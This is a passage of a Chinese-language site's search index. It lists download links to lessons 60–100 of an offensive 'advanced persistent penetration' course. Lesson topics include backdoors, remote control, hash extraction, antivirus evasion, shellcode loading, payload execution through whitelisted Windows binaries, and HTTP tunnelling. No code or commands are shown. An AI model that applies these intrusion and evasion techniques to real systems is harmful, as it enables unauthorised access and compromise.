href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%9B%9B%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%EF%BC%88%E7%AC%AC%E5%85%AD%E5%8D%81%E8%AF%BE%EF%BC%89.docx">60.高级持续渗透-第四季关于后门</a></h3><h3 id="61-高级持续渗透-第五季关于后门"><a href="#61-高级持续渗透-第五季关于后门" class="headerlink" title="61.高级持续渗透-第五季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%94%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.docx">61.高级持续渗透-第五季关于后门</a></h3><h3 id="62-高级持续渗透-第六季关于后门"><a href="#62-高级持续渗透-第六季关于后门" class="headerlink" title="62.高级持续渗透-第六季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AD%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.docx">62.高级持续渗透-第六季关于后门</a></h3><h3 id="63-高级持续渗透-第七季demo的成长"><a href="#63-高级持续渗透-第七季demo的成长" class="headerlink" title="63.高级持续渗透-第七季demo的成长"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%83%E5%AD%A3demo%E7%9A%84%E6%88%90%E9%95%BF.docx">63.高级持续渗透-第七季demo的成长</a></h3><h3 id="64-高级持续渗透-第八季demo便是远控"><a href="#64-高级持续渗透-第八季demo便是远控" class="headerlink" title="64.高级持续渗透-第八季demo便是远控"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AB%E5%AD%A3demo%E4%BE%BF%E6%98%AF%E8%BF%9C%E6%8E%A7.docx">64.高级持续渗透-第八季demo便是远控</a></h3><h3 id="65-离线提取目标机hash补充"><a href="#65-离线提取目标机hash补充" class="headerlink" title="65.离线提取目标机hash补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%E8%A1%A5%E5%85%85.docx">65.离线提取目标机hash补充</a></h3><h3 id="66-借助aspx对payload进行分离免杀"><a href="#66-借助aspx对payload进行分离免杀" class="headerlink" title="66.借助aspx对payload进行分离免杀"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%9A%E5%80%9F%E5%8A%A9aspx%E5%AF%B9payload%E8%BF%9B%E8%A1%8C%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80.docx">66.借助aspx对payload进行分离免杀</a></h3><h3 id="67-meterpreter下的irb操作第一季"><a href="#67-meterpreter下的irb操作第一季" class="headerlink" title="67.meterpreter下的irb操作第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%9Ameterpreter%E4%B8%8B%E7%9A%84irb%E6%93%8D%E4%BD%9C%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">67.meterpreter下的irb操作第一季</a></h3><h3 id="68-基于Ruby内存加载shellcode第一季"><a href="#68-基于Ruby内存加载shellcode第一季" class="headerlink" title="68.基于Ruby内存加载shellcode第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ERuby%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDshellcode%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">68.基于Ruby内存加载shellcode第一季</a></h3><h3 id="69-渗透，持续渗透，后渗透的本质"><a href="#69-渗透，持续渗透，后渗透的本质" class="headerlink" title="69.渗透，持续渗透，后渗透的本质"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%9A%E6%B8%97%E9%80%8F%EF%BC%8C%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F%EF%BC%8C%E5%90%8E%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8.docx">69.渗透，持续渗透，后渗透的本质</a></h3><h3 id="70-ftp一句话下载payload补充"><a href="#70-ftp一句话下载payload补充" class="headerlink" title="70.ftp一句话下载payload补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E4%B8%83%E5%8D%81%E8%AF%BE%EF%BC%9Aftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.docx">70.ftp一句话下载payload补充</a></h3><h3 id="71-基于白名单Msbuild-exe执行payload第一季"><a href="#71-基于白名单Msbuild-exe执行payload第一季" class="headerlink" title="71.基于白名单Msbuild.exe执行payload第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">71.基于白名单Msbuild.exe执行payload第一季</a></h3><h3 id="72-基于白名单Installutil-exe执行payload第二季"><a href="#72-基于白名单Installutil-exe执行payload第二季" class="headerlink" title="72.基于白名单Installutil.exe执行payload第二季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.docx">72.基于白名单Installutil.exe执行payload第二季</a></h3><h3 id="73-基于白名单Regasm-exe执行payload第三季"><a href="#73-基于白名单Regasm-exe执行payload第三季" class="headerlink" title="73.基于白名单Regasm.exe执行payload第三季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3.docx">73.基于白名单Regasm.exe执行payload第三季</a></h3><h3 id="74-基于白名单regsvcs-exe执行payload第四季"><a href="#74-基于白名单regsvcs-exe执行payload第四季" class="headerlink" title="74.基于白名单regsvcs.exe执行payload第四季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95regsvcs.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3.docx">74.基于白名单regsvcs.exe执行payload第四季</a></h3><h3 id="75-基于白名单Mshta-exe执行payload第五季"><a href="#75-基于白名单Mshta-exe执行payload第五季" class="headerlink" title="75.基于白名单Mshta.exe执行payload第五季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/75-77/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%94%E5%AD%A3.docx">75.基于白名单Mshta.exe执行payload第五季</a></h3><h3 id="76-基于白名单Compiler-exe执行payload第六季"><a href="#76-基于白名单Compiler-exe执行payload第六季" class="headerlink" title="76.基于白名单Compiler.exe执行payload第六季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/75-77/%E7%AC%AC%E4%B8%83%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AD%E5%AD%A3.docx">76.基于白名单Compiler.exe执行payload第六季</a></h3><h3 id="77-基于白名单Csc-exe执行payload第七季"><a href="#77-基于白名单Csc-exe执行payload第七季" class="headerlink" title="77.基于白名单Csc.exe执行payload第七季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/75-77/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%83%E5%AD%A3.docx">77.基于白名单Csc.exe执行payload第七季</a></h3><h3 id="78-基于白名单Msiexec执行payload第八季"><a href="#78-基于白名单Msiexec执行payload第八季" class="headerlink" title="78.基于白名单Msiexec执行payload第八季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/78-80/%E7%AC%AC%E4%B8%83%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3.docx">78.基于白名单Msiexec执行payload第八季</a></h3><h3 id="79-基于白名单Regsvr32执行payload第九季"><a href="#79-基于白名单Regsvr32执行payload第九季" class="headerlink" title="79.基于白名单Regsvr32执行payload第九季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/78-80/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B9%9D%E5%AD%A3.docx">79.基于白名单Regsvr32执行payload第九季</a></h3><h3 id="80-基于白名单Wmic执行payload第十季"><a href="#80-基于白名单Wmic执行payload第十季" class="headerlink" title="80.基于白名单Wmic执行payload第十季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/78-80/%E7%AC%AC%E5%85%AB%E5%8D%81%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%AD%A3.docx">80.基于白名单Wmic执行payload第十季</a></h3><h3 id="81-基于白名单Rundll32-exe执行payload第十一季"><a href="#81-基于白名单Rundll32-exe执行payload第十一季" class="headerlink" title="81.基于白名单Rundll32.exe执行payload第十一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%80%E5%AD%A3.docx">81.基于白名单Rundll32.exe执行payload第十一季</a></h3><h3 id="82-基于白名单Odbcconf执行payload第十二季"><a href="#82-基于白名单Odbcconf执行payload第十二季" class="headerlink" title="82.基于白名单Odbcconf执行payload第十二季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%AD%A3.docx">82.基于白名单Odbcconf执行payload第十二季</a></h3><h3 id="83-基于白名单PsExec执行payload第十三季"><a href="#83-基于白名单PsExec执行payload第十三季" class="headerlink" title="83.基于白名单PsExec执行payload第十三季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%89%E5%AD%A3.docx">83.基于白名单PsExec执行payload第十三季</a></h3><h3 id="84-基于白名单Forfiles执行payload第十四季"><a href="#84-基于白名单Forfiles执行payload第十四季" class="headerlink" title="84.基于白名单Forfiles执行payload第十四季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.docx">84.基于白名单Forfiles执行payload第十四季</a></h3><h3 id="85-基于白名单Pcalua执行payload第十五季"><a href="#85-基于白名单Pcalua执行payload第十五季" class="headerlink" title="85.基于白名单Pcalua执行payload第十五季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%94%E5%AD%A3.docx">85.基于白名单Pcalua执行payload第十五季</a></h3><h3 id="86-基于白名单Msiexec执行payload第八季补充"><a href="#86-基于白名单Msiexec执行payload第八季补充" class="headerlink" title="86.基于白名单Msiexec执行payload第八季补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85.docx">86.基于白名单Msiexec执行payload第八季补充</a></h3><h3 id="87-基于白名单Cmstp-exe执行payload第十六季"><a href="#87-基于白名单Cmstp-exe执行payload第十六季" class="headerlink" title="87.基于白名单Cmstp.exe执行payload第十六季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.docx">87.基于白名单Cmstp.exe执行payload第十六季</a></h3><h3 id="88-基于白名单Ftp-exe执行payload第十九季"><a href="#88-基于白名单Ftp-exe执行payload第十九季" class="headerlink" title="88.基于白名单Ftp.exe执行payload第十九季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%AD%A3.docx">88.基于白名单Ftp.exe执行payload第十九季</a></h3><h3 id="89-基于白名单Url-dll执行payload第十七季"><a href="#89-基于白名单Url-dll执行payload第十七季" class="headerlink" title="89.基于白名单Url.dll执行payload第十七季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E5%85%AB%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Url.dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%83%E5%AD%A3.docx">89.基于白名单Url.dll执行payload第十七季</a></h3><h3 id="90-基于白名单zipfldr-dll执行payload第十八季"><a href="#90-基于白名单zipfldr-dll执行payload第十八季" class="headerlink" title="90.基于白名单zipfldr.dll执行payload第十八季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/81-90/%E7%AC%AC%E4%B9%9D%E5%8D%81%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95zipfldr.dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AB%E5%AD%A3.docx">90.基于白名单zipfldr.dll执行payload第十八季</a></h3><h3 id="91-从目标文件中做信息搜集第一季"><a href="#91-从目标文件中做信息搜集第一季" class="headerlink" title="91.从目标文件中做信息搜集第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%9A%E4%BB%8E%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E4%B8%AD%E5%81%9A%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">91.从目标文件中做信息搜集第一季</a></h3><h3 id="92-实战中的Payload应用"><a href="#92-实战中的Payload应用" class="headerlink" title="92.实战中的Payload应用"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%9A%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84Payload%E5%BA%94%E7%94%A8.docx">92.实战中的Payload应用</a></h3><h3 id="93-与CrackMapExec结合攻击"><a href="#93-与CrackMapExec结合攻击" class="headerlink" title="93.与CrackMapExec结合攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9A%E4%B8%8ECrackMapExec%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.docx">93.与CrackMapExec结合攻击</a></h3><h3 id="94-基于实战中的small-payload"><a href="#94-基于实战中的small-payload" class="headerlink" title="94.基于实战中的small payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84small%20payload.docx">94.基于实战中的small payload</a></h3><h3 id="95-基于Portfwd端口转发"><a href="#95-基于Portfwd端口转发" class="headerlink" title="95.基于Portfwd端口转发"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8EPortfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.docx">95.基于Portfwd端口转发</a></h3><h3 id="96-HTTP隧道ABPTTS第一季"><a href="#96-HTTP隧道ABPTTS第一季" class="headerlink" title="96.HTTP隧道ABPTTS第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%9AHTTP%E9%9A%A7%E9%81%93ABPTTS%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">96.HTTP隧道ABPTTS第一季</a></h3><h3 id="97-MSF配置自定义Payload控制目标主机权限"><a href="#97-MSF配置自定义Payload控制目标主机权限" class="headerlink" title="97.MSF配置自定义Payload控制目标主机权限"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%9AMSF%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89Payload%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90.docx">97.MSF配置自定义Payload控制目标主机权限</a></h3><h3 id="98-HTTP隧道reGeorg第二季"><a href="#98-HTTP隧道reGeorg第二季" class="headerlink" title="98.HTTP隧道reGeorg第二季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9AHTTP%E9%9A%A7%E9%81%93reGeorg%E7%AC%AC%E4%BA%8C%E5%AD%A3.docx">98.HTTP隧道reGeorg第二季</a></h3><h3 id="99-HTTP隧道Tunna第三季"><a href="#99-HTTP隧道Tunna第三季" class="headerlink" title="99.HTTP隧道Tunna第三季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B9%9D%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%9AHTTP%E9%9A%A7%E9%81%93Tunna%E7%AC%AC%E4%B8%89%E5%AD%A3.docx">99.HTTP隧道Tunna第三季</a></h3><h3 id="100-HTTP隧道reDuh第四季"><a href="#100-HTTP隧道reDuh第四季" class="headerlink" title="100.HTTP隧道reDuh第四季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/91-100/%E7%AC%AC%E4%B8%80%E7%99%BE%E8%AF%BE%EF%BC%9AHTTP%E9%9A%A7%E9%81%93reDuh%E7%AC%AC%E5%9B%9B%E5%AD%A3.docx">100.HTTP隧道reDuh第四季</a></h3>]]></content>
    
    
    <categories>
      
      <category>学习资源下载</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>关于</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>资源</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
